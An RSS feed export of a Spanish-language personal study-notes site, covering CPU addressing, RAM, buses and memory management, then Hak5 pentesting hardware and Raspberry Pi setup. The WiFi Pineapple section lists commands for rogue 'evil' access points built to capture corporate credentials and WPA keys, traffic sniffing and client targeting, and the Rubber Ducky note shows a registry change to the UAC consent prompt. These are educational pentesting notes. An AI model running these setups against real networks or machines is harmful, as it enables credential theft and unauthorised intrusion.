<br>Algo que me ayudo personalmente a entender un poco más esto del direccionamiento de memorias, bits, CPU, etc. Es ver a la memoria RAM (Random Access Memory), una memoria voltail que ante la memoria de almacenamiento es mucho más rapida para el procesamiento de datos, como una "biblioteca", es esta buscamos guardar "libros" (datos), donde cada libro tiene un número de estante (Dirección en memoria). Una CPU (bibliotecario) que necesita encontrar y leer los libros<br>Resumiendo, simplifiquemos en que:<br>Storage Space / Espacio de almacenamiento<br>
<br>Esto se refiere a cuánto espacio ocupa un programa o archivo en el disco duro o SSD.
<br>Un programa que ocupa, por ejemplo, 100 MB en disco, tiene su código y datos almacenados en esos 100MB en el SSD, HDD, etc.<br>
Memory Addressing Capability / Capacidad de Direccionamiento de Memoria:
<br>Esto se refiere a la cantidad de memoria RAM que una CPU (Procesador) puede manejar o acceder directamente.
<br>En una arquitectura de 32 bits, la CPU puede direccionar hasta 4GB de memoria RAM.
<br>En una arquitectura de 64 bits, la CPU puede direccionar una cantidad de memoria mucho mayor (Teóricamente 16 exabytes, aunque en la práctica es mucho menos debido a las limitaciones físicas actuales).<br>
RAM and Processes / Memoria RAM y Procesos:
<br>Es el espacio de trabajo temporal donde el sistema operativo y los programas cargan los datos y el código que necesistan mientras están en ejecución.
<br>Cada programa que se ejecuta encesita espacio en la RAM para sus datos y código.
]]></description><link>https://dobliuw.com/notes/6.-hardware/components/cpu/cpu.html</link><guid isPermaLink="false">Notes/6. Hardware/Components/CPU/CPU.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 24 May 2024 14:53:24 GMT</pubDate></item><item><title><![CDATA[Understanding the RAM]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:sistemas" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#sistemas</a> <a class="tag" href="https://dobliuw.com/?query=tag:memoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#memoria</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:sistemas" class="tag" target="_blank" rel="noopener nofollow">#sistemas</a> <a href="https://dobliuw.com?query=tag:memoria" class="tag" target="_blank" rel="noopener nofollow">#memoria</a>
<br><br><br>La memoria RAM (Random Access Memory) es un tipo de memoria de acceso rápido que se utiliza en los or denadores y otros dispositivos electrónicos. Su función principal es proporcionar almacenamiento temporal de datos qeu el procesador necesita para llevar a cabo tareas y operaciones. <br>La memoria RAM almacena temporalmente datos y rpogeamas que están en uso o que se acceden con frecuencia, lo que permite al procesador acceder a ellos de manera más rápida qeu si tuviera que recuperarlos desde un disco duro u otro medio de almacenamiento más lento. Esto acelear el rendimiento del sistema, ya que la lectura y escritura de datos en la RAM es mucho más rápida que en un disco duro.<br>Denominamos RAM (Random Access Memory) ya que se puede acceder a la información de una manera más rapida yendo directamente con una dirección al lugar en el que se encuentran los datos y recorriendo todos los datos.<br>
<img alt="ram_image.png" height="790" src="https://dobliuw.com/lib/media/ram_image.png" style="width: 1090px; max-width: 100%;"><br>
Imagen ilustrativa de una memoria RAM DDR4<br><br><br>Los canales y BUSES son la forma en la que se transfieren los datos entre la memoria y otros componentes, como el procesador y la placa madre.<br>
<br>
Canales de memoria (Memory Channels): Los canales de memoria son vías de comunicación o caminos a través de los cuales los datos se transfieren entre la memoria RAM y el procesador. Los procesadores modernos admiten múltiples canales de memoria, que permiten una mayor velocidad de transferencia de datos. Utilizar varios canales de mmeoria al mismo tiempo puede mejorar significativamente el rendimiento del sistema, ya que se pueden trasmitir más datos simúltaneamente. La memoria RAM se instala en múdulos DIMMs uqe se conectan a estos canales de memoria que se componen de BUSES.

<br>
Buses de memoria: Los buses de memoria son los conductos de datos y direcciones que conectan la memoria RAM con el procesador y otros componentes del sistema. Estos buses se utilizan para transmitir datos entre la CPU y la memoria. Los buses de memoria tienen una velocidad de reloj que determina la velocidad a la que los datos pueden ser transferidos entra la CPU y la mmeoria. A esto se lo conoce como el famoso DDR RAM (Double Data Rate Random Access Memory) utiliza buses que transmiten datos en el fanco ascendente y descendente del ciclo del reloj.

<br>Podemos resumir diciendo que los canales son vías de comunicación entre los componentes del sistema, los cuales se componen de BUS (Buses en plural), que son pequeños "cables" (Pistas de cobre) que conducen la electricidad (0s y 1s), lo que se demonida como que son los encargados de conducir los datos.<br>Imagen de un buses.<br>
<img alt="bus_image.png" src="https://dobliuw.com/lib/media/bus_image.png"><br><br><br>Antes de hablar de los DIMM, ya entendiendo de que tratan los Canales y los Buses, es importante tener en cuenta que los DIMM se comunican con el procesador utilizando un canal que utiliza 3 tipos de buses distintos, el bus de Direcciones, bus de Control, bus de Reloj y bus de Datos.<br>
<br>Buses de Direcciones (Address Bus): Estos buses, son 17 "cables" (Pistas de cobres), por lo que son 17 bits, es decir números desde el 0 al 131.071, que indican las direcciones en memoria de donde se recuperarán los datos o se alojarán (Acción que será determinada por los Buses de Control).
<br><img alt="address_bus.png" src="https://dobliuw.com/lib/media/address_bus.png"><br>
<br>Buses de Control (Control Bus): Estos buses de control son responsables de gestionar y coordinar las operaciones de lectura y escritura en la memoria RAM. Estos buses transmiten señales de control que indican al sistema cuiándo se debe leer o escribir datos.
<br><img alt="control_bus.png" src="https://dobliuw.com/lib/media/control_bus.png"><br>
<br>Bus de Reloj (Clock Bus): Señal eléctrica que marca el ritmo o la velocidad de operación de un sistema informático. El bus del reloj es el generador de pulsos elécticosd qeu sincroniza y coodina las operaciones de todos los componentes del sistema.
<br><img alt="clock_bus.png" src="https://dobliuw.com/lib/media/clock_bus.png"><br>
<br>Buses de Datos (Data Bus): Los buses de datos son utilizados para la transferencia de los propios datos entre la memoria RAM y la CPU. Estos buses transportan los datos que se leen desde la memoria  oque se escriben en ella. Estos buses son de 64 Bits y aca es donde entra en juego nuestro nuevo concepto DIMM, así como también el concepto de SIMM. 
<br><img alt="data_bus.png" src="https://dobliuw.com/lib/media/data_bus.png"><br>El DIMM o Módulo de Memoria de Doble Línea en español, se refiere a un tipo de módulo de memoria utilizado en computadoras y otros dispositivos electrónicos para ampliar la memoria RAM. Los DIMM son una forma común de empaquetar y conectar chips de memoria en placas de circuito impreso que luego se insertan en las ranuras de memoria de una placa madre o una placa base de computadora.<br>Los DIMM son una evolución de los SIMMns (Single In-Line Memory Modules), que solo tenía contacto de un lado de la memoria, lo que limitaba la memoria teniendo un menor rendimiento.<br>Básicamente en el DIMM contamos con estos "lectores" de doble cara (Tanto de frente como detras de la memoria), mientras que en los SIMM esto no erá así y solo contabamos con estos lectores de una sola cara de la memoria, por esto con los SIMM teníamos 32 bits de lectura y ahora con los DIMM contamos con 64 bits.<br>Imagen del SIMM.<br>
<img alt="SIMM_image.png" src="https://dobliuw.com/lib/media/simm_image.png"><br>Imagen del DIMM.<br>
<img alt="DIMM_image.png" src="https://dobliuw.com/lib/media/dimm_image.png"><br>De aquí su nombre de DIMM (Double In-Line Module Memory).<br><br><br>El Dual Channel (Canal Doble) es una tecnología utilizada en las placas madre para mejorar el rendimiento de la memoria RAM. Esta tecnología permite a la memoria RAM operar en dos canales de forma simultánea, lo que aumenta la velocidad de transferencia de datos entre la memoria y el procesador. En lugar de accedera a la memoria a través de un solo canal, el dual channel permite la transferenica paralela de datos a través de dos canales de memoria.<br><img alt="dual_channel_image.png" src="https://dobliuw.com/lib/media/dual_channel_image.png"><br><br><br>El reloj es un funcionalidad que posee el procesador y es la frecuencia o velocidad de reloj del sistema (Reloj de CPU o Reloj Central). Esta es una señal eléctrica que oscila a una frecuencia constante y regula la velocidad a la que el procesador ejecuta instrucciones y realiza operaciones.<br>El reloj del procesador se mide en hercios (Hz) y generalmente se expresa en múltiplos como megahercios (MHz) o Gigahercios (GHz). Por ejemplo, si tenemos un procesador que funciona a 3.0 GHz, significa que el reloj oscila a 3.000.000.000 de veces por segundo.<br>La velocidad del reloj del procesador está relacionada con la velocidad de acceso a la memoria RAM. Los procesadores realizan muchas operaciones que requieren el acceso a datos almacenados en la memoria RAM. Ya que es este el que indica con que frecuencia la memoria RAM deberá revisar los datos entrantes.<br>
Gracias a esto, es que la memoria RAM recibe el nombre de SDRAM (Synchronus Dynamic Random-Acces Memory). <br>En un pasado, cuando la frecuencia emitida del reloj (Siendo esta la orden para la reelectura de datos) se apagaba, era cuando se completaba un ciclo de datos, pero cambiaron el sistema para que esto suceda cuando sube o baja la frecuencia, de esta manera nace el famoso DDR (Doble Data Rate).<br><img alt="pre_DDR.png" src="https://dobliuw.com/lib/media/pre_ddr.png"><br>En cambio, con DDR aumentamos la velocidad, conocido también como Pumping, lo que permite transmitir datos dos veces por ciclo del reloj (DDR).<br><img alt="DDR_image.png" src="https://dobliuw.com/lib/media/ddr_image.png">]]></description><link>https://dobliuw.com/notes/6.-hardware/components/memory/memories/understanding-the-ram.html</link><guid isPermaLink="false">Notes/6. Hardware/Components/Memory/Memories/Understanding the RAM.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 22 Dec 2023 23:20:04 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/ram_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/ram_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Memory management]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:sistemas" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#sistemas</a> <a class="tag" href="https://dobliuw.com/?query=tag:memoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#memoria</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:sistemas" class="tag" target="_blank" rel="noopener nofollow">#sistemas</a> <a href="https://dobliuw.com?query=tag:memoria" class="tag" target="_blank" rel="noopener nofollow">#memoria</a>
<br><br><br>La memoria es un área de almacenamiento dividido en unidades a las que se puede referenciara a través de una dirección. Es importante tener en cuenta que existen múltiples tipos de memoria, como la memoria RAM, ROM, memoria Cache, memoria Virtual, memoria de Almacenamiento, memoria de BIOS, etc.<br><br><br>El Gestor de memoria es un componente del Sistema Operativo que se encarga de las tareas relacionadas con la administración de la Memoria Principal (Memoria RAM).<br>
<br>Asignación de Memoria RAM a los procesos que la solicitan. 
<br>Localización de espacios libres y ocupados.
<br>Aprovechamiento máximo de la memoria.
<br>La memoria es una amplia tabla de datos, cada uno de los cuales cuenta con su propia dirección. Es importante tener en cuenta que para que los programas puedan ser ejecutados es necesario que estén cargados en memoria principal y que se almacene de modo permanente información necesaria en memoria secundaria (HDD, SSD, USB, etc).<br><br><br>Las particiones de memoria son divisiones lógicas de la memoria RAM utilizadas para administrar y asignar espacio a programas en ejecución. Hay dos tipos principales de particiones de memoria:<br>
<br>
Particiones Estáticas: En este enfoque, la memoria se divide en particiones fijas de tamaños predeterminados. Cada partición puede albergar un programa. Este método puede llevar a un desperdicio de memoria si los programas son de diferentes tamaños y no se ajustan bien en las particiones.

<br>
Particiones Dinámicas: En este enfoque, la memoria se divice en particiones de tamaño variable según la demanda. Esto permite un uso más eficiente de la memoria, ya que las particiones se asignan dinámicamente a programas a medida que se cargan y liberan. Sin embargo, esto puede ser más complejo de implementar.

<br><br><br>La fragmentación es la distribución desordenada y fragmentada de bloques de memoria en una región de almacenamiento, como la memoria RAM. Esta fragmentación puede tener un impacto negativo en el rendimiento y la eficiencia de un sistema informático. Existen dos tipos principales de fragmentación:<br>
<br>
Fragmentación Interna: Este tipo de fragmentación ocurre cuando se asigna más memoria de la necesaria para almacenar un proceso o programa en ejecución. Por ejemplo, en un sistema con particiones de memoria estática, si un rpograma ocupa solo una parte de la partición asignada, la diferencia entre el tamaño de la partciión y el tamaño del programa se considera fragmentación interna. La memoria en exceso asignada no se puede utilizar para otros fines, lo que resulta en una desperdicio de recursos.

<br>
Fragmentación Externa: La fragmentación externa ocurre cuando hya suficiente memoria total disponible, pero no se puede asignar un bloque contiguo lo suficientemente grande para cargar un rpograma en ejecucción. Esto puede deberse a que hay suficiente memoria libre en términos absolutos, pero está dispersa en pequeños bloques no contiguos. La fragmentación externa puede provocar que un sistema sea incapaz de cargar programas que, en teoría, podrían ejecutarse debido a la falta de bloques de memoria contiguos suficientemente grandes.

<br>La fragmentación puede afectar negativamente el rendimiento del sistema y la capacidad de asignar memoria de manera eficiente. Para abordar la fragmentación, los sistemas operativos y las aplicaciones utilizan diversas técnicas, como la compactación, la paginación y la segmentación.<br><br><br>La paginación es una técnica de gestión de memoria que divide la memoria en páginas de tamaño fijo. Los programas se dividen en páginas del mismo tamaño, y estas páginas se cargan en la memoria de manera independiente. La paginación permite una gestión eficiente de la memoria y facilita la asignación de bloques contiguos.  También facilita la implementacion de memoria virtual y el uso de la memoria secundaria (como el disco) para ampliar la memoria RAM.<br>Por otro lado, la segmentación es una técnica de gestión de memoria que divide la memoria en segmentos lógicos o secciones más grandes que pueden contener diferentes tipos de datos o componentes de un programa. Cada segmento puede crecer o contraerse de manera independiente. La segmentación es útil para dividir un programa en partes lógicas como el código, los datos, la pila ,etc. La gestión de segmentación puede ser más flexible que la paginación, pero requiere una gestión más compleja para asignar y liberar memoria. <br><br><br>La memoria virtual es una técnica que permite que un sistema operativo haga que un programa crea que tiene acceso a una cantidad de memoria física más grande de la que realmente está disponible. Se logra mediante la combinación de la memoria RAM y el almacenamiento en disco. La memoria virtual permite que múltiples programas se ejecuten en una máquina sin preocuparse por la cantidad física de RAM. Los programas puede acceder a una amplia memoria virtual, y el sistema operativo se encarga de cargar las partes necesarias en RAM a medida que se requieren. <br>La traducción de las direcciones virtuales a reales es implementada por una Unidad de Manejo de Memoria (MMU). El sistema operativo es el responsable de decir qué partes de la memoria del programa es mantenida en memoria física. además mantiene las tablas de traducción de direcciones (Si se usa paginación la tabla se denomina tabla de paginación), que proveen las relaciones entre direcciones virtuales y físicas, para uso de la MMU.<br>El Swapping es una técnica de gestión de memoria virtual que implica mover bloques de datos entre la memoria principal (RAM) y la memoria secundaria (Generalmente el disco duro) según sea necesario. Cuando la memoria RAM se agota, el sistema operativo puede "intercambiar" bloques de datos entre la MP y la MS para otros programas. El swapping puede ralentizar el rendimiento del sistema si se realiza con frecuencia, ya que acceder a la memoria del disco es más lento que acceder a la RAM.<br><img alt="virtual_memory.png" src="https://dobliuw.com/lib/media/virtual_memory.png">]]></description><link>https://dobliuw.com/notes/6.-hardware/components/memory/memory-management.html</link><guid isPermaLink="false">Notes/6. Hardware/Components/Memory/Memory management.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 22 Dec 2023 23:20:32 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/virtual_memory.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/virtual_memory.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[USB Rubber Ducky]]></title><description><![CDATA[ 
 <br><br>El USB Rubber Ducky es un dispositivo que se presenta como una unidad USB, pero en realidad actúia como un teclado programable que puede enviar pulsaciones de teclas predefinidas a un equipo. Esto permite automatizar tareas y realizar ataques de inyección de comandos en cuestión de segundos.<br><br><br><br><br>&gt; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 1
Copy]]></description><link>https://dobliuw.com/notes/6.-hardware/hak5/hotplug-tools/usb-rubber-ducky.html</link><guid isPermaLink="false">Notes/6. Hardware/Hak5/HotPlug Tools/USB Rubber Ducky.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Sat, 08 Jun 2024 02:52:22 GMT</pubDate></item><item><title><![CDATA[MK7AC WiFi Adapter]]></title><description><![CDATA[ 
 <br><br>El dispositivo de <a data-tooltip-position="top" aria-label="https://hak5.org" rel="noopener nofollow" class="external-link" href="https://hak5.org" target="_blank">Hak5</a> llamado MK7AC WiFi Adapter es un adaptador WiFi 802.11ac compatible con la <a data-href="WiFi Pineapple Mark VII" href="https://dobliuw.com/notes/6.-hardware/hak5/wifi-pentesting/wifi-pineapple-mark-vii.html" class="internal-link" target="_self" rel="noopener nofollow">WiFi Pineapple Mark VII</a> y muchas herramientas de Linux para monioreo y auditoría de WiFi de amplio espectro, soporta las bandas de 2.4GHz y 5GHz, proporcionando capacidades mejoradas para audtoría de redes WiFi. Este dispositivo permite realizar pruebas de penetración más robustas y efectivas debido a sus capacidades dual-band, agregando capacidades de dual-band 802.11ac monitor e inection al Pineapple.<br>
<br>MK7AC WiFi Adapter<br>
<img alt="mk7ap_wifi_adapter_hak5.png" height="600" src="https://dobliuw.com/lib/media/mk7ap_wifi_adapter_hak5.png" style="width: 600px; max-width: 100%;">
<br><br><br>El MK7AC WiFi Adapter contiene chipsets avanzados que ofrecen mejores tasas de trasnferencia  y capacidades de captura de paquetes, pero como mencionamos, soporta el modo monitor y modo inyección de paquetes.<br>La inyección de apquetese es la capacidad de una tarjeta de red inalámbrica para enviar (Inyectar) paquetese específicos en una red inalámbrica de manera controlada y deliberada. Esto es fundamental para ejecutar una variedad de ataques y rpuebas de peentración en redes WiFi, como los ataques descritos en la sección de 4. Cybersecurity &gt; RedTeam &gt; Pentesting &gt; Networks &gt; Attacks, tras las configuraciones deseadas y necesarias descritas en la sección de <a data-href="0. Hacking WiFi" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/0.-hacking-wifi.html" class="internal-link" target="_self" rel="noopener nofollow">0. Hacking WiFi</a>.]]></description><link>https://dobliuw.com/notes/6.-hardware/hak5/wifi-pentesting/mk7ac-wifi-adapter.html</link><guid isPermaLink="false">Notes/6. Hardware/Hak5/WiFi Pentesting/MK7AC WiFi Adapter.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Sat, 08 Jun 2024 02:29:35 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/mk7ap_wifi_adapter_hak5.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/mk7ap_wifi_adapter_hak5.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[<a data-tooltip-position="top" aria-label="https://docs.hak5.org/wifi-pineapple" rel="noopener nofollow" class="external-link" href="https://docs.hak5.org/wifi-pineapple" target="_blank">WiFi Pineapple</a>]]></title><description><![CDATA[ 
 <br><br>La WiFi Pineapple es una herramienta de auditoría de redes inalámbricas desarrollada por <a data-tooltip-position="top" aria-label="https://hak5.org/" rel="noopener nofollow" class="external-link" href="https://hak5.org/" target="_blank">Hak5</a>. Es bastante conocida en el mundo de la ciberseguridad por la capacidad de realizar diversas prueba de penetración y ataques, así como análisis de redes WiFi. Esta facilita la creación de ataques como MITM, Rogue AP, recopilación de datos, evil twin attack, y otros muchos vistos en <a data-href="0. Hacking WiFi" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/0.-hacking-wifi.html" class="internal-link" target="_self" rel="noopener nofollow">0. Hacking WiFi</a>.<br>Algunas de sus características principales son...<br>
<br>MITM (Man-In-The-Middle): Permite interceptar y manipular el tráfico de los dispositivos conectados.
<br>Rogue AP (Access Point): Puede crear un punto de acceso falso para atraer a usuarios a conectarse y luego capturar su tráfico.
<br>Sniffing: Capturar paquetes de datos en la red para su posterior análisis.
<br>Deauthentication Attacks: Expulsa a los clientes de su red para forzarlos a conectarse a la Pineapple.
<br>Modularity: Soporta módulos adicionales que pueden iinstalarse para expandir su funcionalidad.
<br><img alt="pineapple_mark_VII_hak5.png" src="https://dobliuw.com/lib/media/pineapple_mark_vii_hak5.png"><br><br><br>Para conectar la WiFi Pineapple para posteriormente conectarnos, podemos hacer uso de esta <a data-tooltip-position="top" aria-label="https://docs.hak5.org/wifi-pineapple/setup/connecting-the-wifi-pineapple" rel="noopener nofollow" class="external-link" href="https://docs.hak5.org/wifi-pineapple/setup/connecting-the-wifi-pineapple" target="_blank">guía</a> proporcionada por Hak5. <br><br><br>Una vez iniciada la Pineapple, deberemos hacer una configuración de la misma, la cual conlleva la instalación del último Firmware, así como la configuración de conexión a internet, usuario, contraseña, etc.<br>Primero que nada, con el comando ifconfig o ipconfig (Depende nuestro sistema operativo) podremós ver las interfaces de red que tenemos, en caso de haber utilizado al usb para conectar la Pineapple a la PC, veriamos que tenemos una intefaz de red con el segmento de red 172.16.42.0/24 donde la IP 172.16.42.1 será nuestro WiFi Pineapple, y podremos acceder mediante el navegador al puerto 1471 para llevar a cabo la gestion web mediante GUI.<br>Nos pedirá que nos conectemos a nuestra red local para poder disponer de conexión a internet y descargar e instalar la última versión del Firmware:<br><img alt="download_latest_firmware_pineapple_hak5.png" src="https://dobliuw.com/lib/media/download_latest_firmware_pineapple_hak5.png"><br>Tras la descarga e instalación del Firmware, se nos solicitaran algunas configuraciones, incluyendo la contraseña para el usuario por el cual podrémos acceder al portal web de configuración o conectarnos a través de ssh a la pineapple. Tras la finalización de estas configuraciones, se nos redireccionará automaticamente a la web final, la cual dispondrá de un login con las credenciales previamente configuradas.<br>
<br>Acceder mediante ssh: 
<br>ssh root@172.16.42.1
Copy<br><br><br>La WiFi Pineapple Mark VII utiliza múltiples interfaces de red para diferentes propósitos, permitiendo realizar diversas tareas de auditoría y pruebas de seguridad. A continuación vamos a describir algunas de estas y su uso típico.<br><br>Esta interfaz es un puente de red que combina múltiples interfaces en una sola, proporcionando una única dirección IP para acceder a la Pineapple, en la mayoría de casos, configurada con la IP 172.16.42.1. El uso típico de esta es para la gestion de red interna y acceso a la GUI o SSH.<br><br>Esta interfaz es la conexión a través del puerto USB-C de la Pineapple. Se utilizap ara conectar la misma a una red cableada o directamente a un equipo, lo que permite el acceso a internet o transferencia de datos.<br><br>Esta interfaz virtual es utilizada para la comunicación interna del sistema para diagnósticos de red y comunicación interna.<br><br>Interfaz inalámbrica principal que puede ser utilizada para diversos propósitos como escaneo de redes o actuación como cliente. Se suele utilizar para escaneo de redes WiFi y conexión a redes abiertas.<br>
<br>Configuración de ejemplo
<br># Validate attributes and details like ssid, channel, etc
iw dev wlan0 info
# Validate additional info
iw dev wlan0 link
Copy<br><br>Subinterfaz de wlan0 dedicada a la gestión de la Pineapple, generalmente utilizada para la conexión GUI de la misma, así como para la gestión y configuración a través de la interfazweb.<br><br>Subinterfaz de wlan0 configurara para ejecutar ataques de Evil Enterprise, que imitan redes corporativas para capturar credenciales creando puntos de accesos falsos.<br>
<br>Configuración de ejemplo
<br>ifconfig wlan0-2 up
hostapd /etc/hostapd/evil-enterprise.conf
Copy<br><br>Subinterfaz de wlan0 configurada para ejecutar ataques de Evil WPA, craendo puntos de acceso falsos para capturar claves WPA/WPA2.<br>
<br>Configuración de ejemplo
<br>ifconfig wlan0-3 up
hostapd /etc/hostapd/evil-wpa.conf
Copy<br><br>Interfaz configurada en modo monitor, utilizada para tareas de reconocimiento y escaneo de redes, permite capturar apquetes y analizar el tráfico de red.<br>
<br>Configuración de ejemplp
<br>ifocnfig wlan1mon up
# Start wlan1mon interface
airmon-ng start wlan1mon
# Kill some process 
airmon-ng check kill
# Sniff trafic
airodump-ng wlan1mon
Copy<br><br>Interfaz que actúia como cliente inalámbrico, permitiendo que la Pineapple se conecte a otras redes WiFi de manera inalambrica.<br><br><br>La WiFi Pineapple Mark VII incluye funcionalidades avanzadas de filtrado para gestionar cómo interactúa con redes y clientes. Estas funcioanlidades son cruciales para realizar pruebas de epentración específicas y controladas.<br><br>El SSID Filter se usa para gestionar qué redes inalámbricas (SSIDs) serán atacadas o con las cuales interactuaremos. En caso de hacer uso de Allow List, los SSIDs que están en este lista serán atacados, mientras que si hacemos uso de Deny List, los SSIDs en está serán ignorados.<br>Para a gregar SSIDs podemos hacer uso de la GUI o del comando pineap para llevar a cabo esto:<br># Add ssid to the list
pineap add_filter_ssid {ssid}
# Delete ssid from the list
pineap del_filter_ssid {ssid}
Copy<br><br>El Client Filter se usa para gestionar qué dispositivos (clientes) serán atacados o con los cuales se interactuará. Similar al SSID Filter, podemos configurar los filtros de clientes de la misma manera, haciendo uso de Allow List para indicar que clientes serán atacados y Deny List para indicar aquellos que serán ignorados.<br>También podemos agregar los clientes haciendo uso de la GUI de la página web o con el comando pineap:<br># Add client to the list
pineap add_filter_mac {mac}
# Delete client from the list
pineap del_filter_mac {mac}
Copy<br>
<br>Ejemplo de la GUI:<br>
<img alt="client_and_ssid_lists_filters_pineapple.png" src="https://dobliuw.com/lib/media/client_and_ssid_lists_filters_pineapple.png">
]]></description><link>https://dobliuw.com/notes/6.-hardware/hak5/wifi-pentesting/wifi-pineapple-mark-vii.html</link><guid isPermaLink="false">Notes/6. Hardware/Hak5/WiFi Pentesting/WiFi Pineapple Mark VII.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 07 Jun 2024 22:36:42 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pineapple_mark_vii_hak5.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pineapple_mark_vii_hak5.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Raspberry PI]]></title><description><![CDATA[ 
 <br><br>La Raspberry PI es computadora pequeña, barata y single-board desarrollada por la fundación Raspberry PI, con el fin de promover la edudación informática y hacerla más accesible a las personas de todo el mundo. Hoy en día este dispositivo de ve involucrado en múltiples proyectos de todo tipo, en mi caso personal, la utilizaré con fines para llevar a cabo un proyecto enlazado con Arduino de hacking, pero vamos a lo más básico... si es una computadora... puede tener linux. <br><br><br>En mi caso uno de los sistemas operativos basados en Linux que más utilizo es Kali Linux, por la amplia colección de herramientas de ciberseguridad que trae consigo, por lo tanto, para llevar a cabo esta instalación dispondremos de las siguientes cosas.<br>
<br>
Equipo: Para llevar a cabo esta instalación, primero que nada necesitaremos disponer de un equipo, no importa si es de escritorio, portatil ni el sistema operativo que tenga, simplemente necesitamos que tenga acceso a internet para poder llevar a cabo las descargas y configuraciones necesarias. Esto puede hacerse con la ayuda de un amigo que disponga de aunque sea la notebook más deteriorada pero que funcione medianamente bien para descargar 2 archivos y bootear la unidad de almacenamiento que utilizará la Raspberry PI.

<br>
Micro SSD: La micro SSD será fundamental para poder llevar a cabo este "proyecto" dado que funcionará como unidad de almacenamiento de las Raspberry PI, queda a libre elección la cantidad de espacio que se le quiere dar, en mi caso conté con una Micro SSD de 128 GB la cual venía con un Adaptador micro SD. 

<br>
Posibilidad de leer Micro SSD o SD: Algo fundamental será contar con un lector SD o Micro SSD, por ejemplo, puede ser el cazo de que contemos con una Notebook la cual puede traer consigo integrada la capacidad de introducir una tarjeta Micro SD, por lo que necesitaremos un adaptador micro SD (Suelen venir junto a la micro ssd). En caso de no contar con esto, podríamos comprar un lector de tarjetas micro sd y ssd con entrada usb, en mi caso adquirí <a data-tooltip-position="top" aria-label="https://articulo.mercadolibre.com.ar/MLA-749257928-lector-de-tarjetas-sd-y-micro-sd-usb-usb-c-micro-usb-_JM#position=28&amp;search_layout=stack&amp;type=item&amp;tracking_id=0693c0c2-b4a3-4c88-a10c-f97f4d499d84" rel="noopener nofollow" class="external-link" href="https://articulo.mercadolibre.com.ar/MLA-749257928-lector-de-tarjetas-sd-y-micro-sd-usb-usb-c-micro-usb-_JM#position=28&amp;search_layout=stack&amp;type=item&amp;tracking_id=0693c0c2-b4a3-4c88-a10c-f97f4d499d84" target="_blank">este</a>. 

<br>
ISO del Sistema Operativo: Como mencioné previamente, en mi caso instalaré Kali Linux, ustedes pueden instalar el sistema operativo que gusten, tengan en cuenta que los recursos de la Raspberry PI no son los mejores, pueden leer las especificaciones según el modelo que vayan a adquirir o ya hayan adquirido. Kali linux puede ser un poco pesado dado que trae múltiples herramientas que a lo mejor nunca usaremos, pero esto es a modo de ejemplo, se podría usar sistemas como Xubuntu, Livuntu u otros según el manejo de sistemas operativos basados en Linux que tengan y en lo que búsquen llevar a cabo. Una vez decidido el sistema operativo a instalar, simplemente nos descargaremos el archivo ISO de este, en mi caso, <a data-tooltip-position="top" aria-label="https://www.kali.org/get-kali/#kali-arm" rel="noopener nofollow" class="external-link" href="https://www.kali.org/get-kali/#kali-arm" target="_blank">Kali para ARM</a>.

<br>
Software de booteo: Como es lógico, necesitaremos hacer que la Micro SSD sea booteable, por lo cual una vez introducida en el sistema donde estamos llevando a cabo la descarga de la ISO, procederemos a llevar a cabo la descarga de un software que nos permite realizar esto, en mi caso suelo utilizar <a data-tooltip-position="top" aria-label="https://rufus.ie/en/" rel="noopener nofollow" class="external-link" href="https://rufus.ie/en/" target="_blank">Rufus</a> (Si llevo a cabo esta acción desde Windows) o en caso de sistemas operativos basados en Linux suelo hacer uso de <a data-tooltip-position="top" aria-label="https://etcher.balena.io/" rel="noopener nofollow" class="external-link" href="https://etcher.balena.io/" target="_blank">Etcher</a>. 

